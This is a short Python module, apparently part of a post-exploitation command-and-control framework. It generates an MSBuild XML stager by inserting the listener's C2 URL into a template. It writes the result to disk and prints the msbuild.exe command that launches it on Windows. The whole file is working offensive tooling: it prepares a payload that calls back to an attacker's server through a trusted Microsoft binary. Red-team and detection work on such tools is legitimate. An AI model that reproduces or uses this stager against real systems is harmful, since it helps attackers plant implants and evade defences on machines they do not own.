from core.utils import print_good, print_info


class STStager:
    def __init__(self):
        self.name = 'msbuild'
        self.description = 'Stage via MSBuild XML inline C# task'
        self.author = '@byt3bl33d3r'
        self.options = {}

    def generate(self, listener, filename=None, as_string=False):
        stager_filename = filename if filename else 'msbuild.xml'

        with open('stagers/templates/msbuild.xml') as template:
            template = template.read()
            template = template.replace('C2_URL', f"{listener.name}://{listener['BindIP']}:{listener['Port']}")

            if not as_string:
                with open(stager_filename, 'w') as stager:
                    stager.write(template)

                    print_good(f"Generated stager to {stager.name}")
                    print_info(
                        f"Launch with 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe {stager_filename}'")
            else:
                return template
